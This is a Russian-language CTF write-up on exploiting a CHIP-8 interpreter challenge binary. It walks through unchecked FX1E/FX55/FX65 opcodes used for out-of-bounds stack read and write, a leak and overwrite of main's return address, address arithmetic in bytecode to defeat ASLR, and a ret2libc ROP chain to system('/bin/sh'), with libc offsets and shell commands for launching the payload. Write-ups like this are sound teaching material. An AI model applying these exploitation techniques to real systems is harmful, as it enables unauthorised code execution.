# C.H.I.P. — writeup (pwn)

> **Corporate Hyperlocal Impact Processor** — «переезжаем со старых компов в облако,
> дисплей оставили, mission-critical задачи продолжатся как обычно».
> По факту — CHIP-8 интерпретатор на C с набором out-of-bounds примитивов.
> Байткод подаётся на stdin, флаг в `/flag.txt`, цель — RCE.
>
> TL;DR: `FX1E` без проверки границ → OOB read/write относительно `memory` →
> читаем и перезатираем адрес возврата `main` (канарейки нет) → ret2libc,
> причём все адреса считаются **внутри самого байткода**, так что ASLR падает
> за одно подключение.

---

## 1. Recon

```
$ file chip
chip: ELF 64-bit LSB pie executable, x86-64, dynamically linked,
      interpreter /lib64/ld-linux-x86-64.so.2, not stripped, with debug_info

$ # защиты
PIE          : да
NX           : да (GNU_STACK RW)
Stack canary : НЕТ  (__stack_chk_fail в символах отсутствует)
RELRO        : partial

$ # libc (приложена)
Debian GLIBC 2.41-12+deb13u3
```

Главное: **нет канарейки** и бинарь не stripped (есть debug_info — gdb знает все
типы и смещения). Инфраструктура: `socat tcp-l:1024,fork,EXEC:chip` за TLS-фронтом
с SNI-роутингом (Let's Encrypt, `CN=chip.flu.xxx`).

---

## 2. Что исполняется

`main` читает весь байткод одним `fread` и крутит классический CHIP-8 fetch-decode-execute:

```c
struct program_state main_state = { 0 };   // лежит на стеке main
...
read_input(&main_state);                    // fread(mem+0x200, 3584, 1, stdin)
sdl_initialize();                           // "flavor", но без дисплея падает (см. §7)
main_state.PC = PROGRAM_START;              // 0x200
while (!sdl_is_quit()) {
    current_state = execute_instruction(&main_state);
    if (current_state != RUNNING) break;
    sdl_update_display(display);
}
```

`read_input` всегда хочет 3584 байта (`MEMORY_SIZE - PROGRAM_START`), поэтому payload
добиваем нулями до 3584 — иначе `fread` блокируется, ожидая остаток.

---

## 3. Баги

Все четыре — в `execute_instruction`. `I` — это `uint16_t` указатель в `memory[4096]`,
но **нигде не проверяется, что `I`/`I+i` в границах массива**.

| opcode | семантика | проблема |
|--------|-----------|----------|
| `FX1E` | `I += V[X] & 0xFFF` | нет верхней границы → `I` можно нарастить до любого 16-битного значения |
| `FX55` | `for i in 0..X: mem[I+i] = V[i]` | **OOB write** относительно `memory` |
| `FX65` | `for i in 0..X: V[i] = mem[I+i]` | **OOB read** относительно `memory` |
| `FX41` | `fwrite(&V[X], 1, 1, stdout)` | кастомный примитив вывода (пригодился бы для leak, но в финале не нужен) |

`A NNN` ставит `I = NNN` (максимум `0xFFF`), а дальше `FX1E` догоняет `I` куда угодно.

---

## 4. Ключевое смещение: адрес возврата `main`

`struct program_state` (`ptype /o`):

```
offset   size   field
     0     96    uint16_t stack[48]
    96   4096    uint8_t  memory[4096]     <-- база OOB
  4192      2    uint16_t I
  4194      2    uint16_t PC
  4196     16    uint8_t  V[16]
  ...
  total size: 4220
```

Пролог `main`:

```asm
push   rbp
push   rbx
sub    rsp, 0x1088
; main_state лежит по rsp (подтверждается: mov WORD [rsp+0x1062], 0x200  == PC@offset 4194)
```

Считаем от адреса возврата `main` (назовём его `R`, это `[rsp]` на входе в `main`):

```
R                      = адрес возврата main
push rbp ; push rbx    -> R-8 = saved rbp, R-16 = saved rbx
sub rsp,0x1088         -> main_state = R - 0x1098
memory  = main_state+0x60 = R - 0x1038
=> R = memory + 0x1038
```

Проверка под gdb:

```
&memory            = 0x7fffffff6f70
*(memory + 0x1038) = 0x7ffff7a2a1ca  ->  __libc_start_call_main + 122
```

То есть по `memory + 0x1038`:
* через `FX65` **читаем** → утечка `libc_base + OFF_RET`;
* через `FX55` **пишем** → перезапись адреса возврата (канарейки-то нет).

Выравнивание: `0x1038 % 16 == 8`, а база кадра всегда 16-выровнена по ABI, поэтому
**`R ≡ 8 (mod 16)` всегда**, независимо от ASLR. Это понадобится для `movaps` в `system`.

---

## 5. Стратегия: математика внутри байткода

ASLR надо бить за одно подключение — второй стадии (повторного `read`) в программе нет.
Но у нас 8-битные регистры `V0..VF` и сложение с переносом (`8XY4` выставляет `VF`),
значит адреса можно собрать **прямо в байткоде**:

```
leak   = *(memory+0x1038) = libc_base + OFF_RET
target = leak + (off_target - OFF_RET)     # дельта — константа, печём в байткод
```

Оффсеты из приложенной libc 2.41:

| что | offset | delta = off − OFF_RET |
|-----|--------|-----------------------|
| `OFF_RET` (возврат в `__libc_start_call_main`) | `0x29ca8` | — |
| `pop rdi ; ret` | `0x2a145` | `0x49d` |
| `/bin/sh` | `0x1a5ea4` | `0x17c1fc` |
| `ret` (выравнивание) | `0x2a146` | `0x49e` |
| `system` | `0x53110` | `0x29468` |

ROP-цепочка поверх `R` (ret2libc; один лишний `ret` — под 16-выравнивание, т.к. `R≡8`):

```
R+0  : pop rdi ; ret
R+8  : &"/bin/sh"
R+16 : ret
R+24 : system
```

Проверка выравнивания: `main` делает `ret` (rsp: R→R+8), `pop rdi;ret` съедает `&binsh`
и возврат (rsp→R+24 через выравнивающий `ret`), на входе в `system` `rsp = R+32 ≡ 8 (mod16)`
— как и ждёт `system`.

Завершаем байткод-программу `00EE` при пустом стеке → `STACK_UNDERFLOW` → цикл рвётся →
эпилог `main` (`add rsp; pop rbx; pop rbp; ret`) уводит в цепочку → `system("/bin/sh")`.

Порядок записи — от дальнего к ближнему, **`R` пишем последним** (он же источник leak,
нельзя затереть раньше, чем прочитали все 4 слова).

---

## 6. CHIP-8 «ассемблер»

Использованные опкоды:

```
A NNN   -> I = NNN              (макс 0xFFF)
FX1E    -> I += VX
6X NN   -> VX = NN
8XY4    -> VX += VY ; VF = carry
8XY0    -> VX = VY
FX65    -> V0..VX = mem[I..]    (OOB read)
FX55    -> mem[I..] = V0..VX    (OOB write)
00EE    -> ret (пустой стек -> STACK_UNDERFLOW)
```

**Установка `I` на произвольный offset** (A достаёт только до 0xFFF):

```
A 0xFFF            ; I = 4095
6D <off-0xFFF>     ; VD = остаток (помещается в байт)
FD1E               ; I += VD
```

**64-битное сложение с переносом** `V0..V7 += delta` (скретч `V8,V9,VA,VB,VF`):

```
69 00                      ; V9 = 0  (carry-in)
; для каждого байта k = 0..7:
68 <delta_byte_k>          ; V8 = байт дельты
8k84 ; 8AF0                ; Vk += V8        ; VA = carry1
8k94 ; 8BF0                ; Vk += V9 (cin)  ; VB = carry2
89A0 ; 89B4                ; V9 = carry1 + carry2   (одновременно не переполнятся)
```

(Доказуемо: `Vk + Dk + cin ≤ 0x1FF`, значит из двух частичных переносов единица
максимум в одном — carry_out = carry1 + carry2 ∈ {0,1}.)

**Одно слово цепочки**:

```
set_I(0x1038) ; FX65(x=7)        ; V0..7 = libc_base + OFF_RET
add_const8(delta)                ; V0..7 = target
set_I(write_off) ; FX55(x=7)     ; mem[write_off..] = target
```

Итог: 4 слова + `00EE` ≈ 522 байта кода, добиваем нулями до 3584.

---

## 7. Нюанс с SDL (локальный запуск)

`sdl_initialize()` зовётся до главного цикла, и headless он падает на
`SDL_CreateRenderer(..., SDL_RENDERER_ACCELERATED)` («Couldn't find matching render
driver») — значит байткод до исполнения не доходит. На боевом сервере дисплей рабочий,
а для локальной отладки SDL глушится через `LD_PRELOAD` крошечной `.so` с no-op
реализациями `SDL_*` (возвращают успех, `SDL_PollEvent`→0). На сам эксплойт это не
влияет — SDL тут действительно «flavor».

---

## 8. Нюанс с инфраструктурой (TLS + SNI)

Хост вида `<rand>.chip.flu.xxx:1024` — общий порт, инстансы разводятся по **TLS SNI**.
Если постучать плейнтекстом — фронт отвечает `HTTP/1.1 400 Bad Request`. Нужно говорить
TLS, SNI = полное имя хоста; фронт терминирует TLS и пробрасывает голый stdin/stdout `chip`.
Проверка:

```
$ openssl s_client -connect <host>:1024 -servername <host> -quiet
... depth=0 CN=chip.flu.xxx ...
Starting CHIP...
Enter your CHIP bytecode >
```

В solve-скрипте — `ssl.CERT_NONE` + `server_hostname=host` (SNI выставляется сам).

---

## 9. Запуск

```bash
# боевой сервер (TLS):
python3 solve.py <host> 1024 ssl

# без TLS (локальный мост):
python3 solve.py 127.0.0.1 1024            # profile remote по умолчанию
python3 solve.py 127.0.0.1 1024 local      # против локальной системной libc

# или руками (дальше вводить команды шелла):
cat exploit.ch8 - | ncat --ssl <host> 1024
```

Скрипт шлёт payload, `main` возвращается в цепочку, поднимается `/bin/sh` на том же
сокете, дальше `cat /flag.txt`.

---

## 10. Файлы

| файл | что |
|------|-----|
| `build_exploit.py` | CHIP-8 ассемблер + генератор payload (профили `remote`/`local`) |
| `solve.py` | сетевой драйвер (чистые сокеты + опциональный TLS, без pwntools) |
| `exploit.ch8` | готовый 3584-байтный payload под libc 2.41 |
| `sdlstub.so` | заглушка SDL для локального запуска |

---

## 11. Чему учит

* Отсутствие проверки границ в «безобидном» опкоде-аккумуляторе (`I += V[X]`) превращает
  интерпретатор в arbitrary relative read/write по стеку.
* Нет канарейки → адрес возврата лежит на фиксированном смещении от буфера и берётся
  напрямую, без лишних leak-трюков.
* Когда второй стадии нет, «вычислитель» можно построить из примитивов самой VM —
  8-битная арифметика с переносом вполне тянет сборку 64-битных адресов, и ASLR
  снимается за одно подключение.
